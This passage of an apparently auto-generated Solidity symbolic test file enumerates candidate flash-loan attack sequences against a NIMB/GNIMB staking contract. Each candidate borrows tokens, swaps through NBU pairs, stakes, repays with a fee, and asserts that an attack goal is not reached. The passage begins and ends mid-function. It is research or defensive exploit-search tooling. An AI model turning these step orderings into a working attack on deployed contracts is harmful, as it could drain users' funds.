        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand975(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand976(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand977(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand978(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand979(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand980(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand981(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand982(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand983(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand984(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand985(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand986(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand987(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand988(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand989(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand990(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand991(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand992(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand993(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand994(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand995(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand996(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand997(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand998(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand999(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1016(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1017(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1018(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1019(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1020(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1021(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1022(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1023(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1024(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1025(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1026(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1027(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1028(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
